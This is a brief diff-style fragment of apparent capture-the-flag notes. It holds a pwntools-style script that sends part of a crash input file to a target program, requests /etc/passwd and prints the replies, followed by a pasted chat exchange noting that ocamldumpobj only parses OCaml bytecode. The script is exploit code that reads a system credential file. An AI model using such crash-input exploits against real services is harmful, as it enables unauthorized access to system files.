@@ -1,0 +1,24 @@
+by hand and by /dev/urandom
+
+f = open("set_mem_crash", "rb")
+pp = f.read()
+io = start()
+rl()
+sl(pp[:449])
+rl()
+sl("/etc/passwd")
+print(rl())
+print(rl())
+print(rl())
+print(rl())
+print(rl())
+re()
+io.clean()
+io.interactive()
+
+ocamldumpobj
+
+so its just taking ocaml bytecode as input and running it?
+IceCreamMan — Today at 6:43 AM
+it doesnt run it
+parses it only
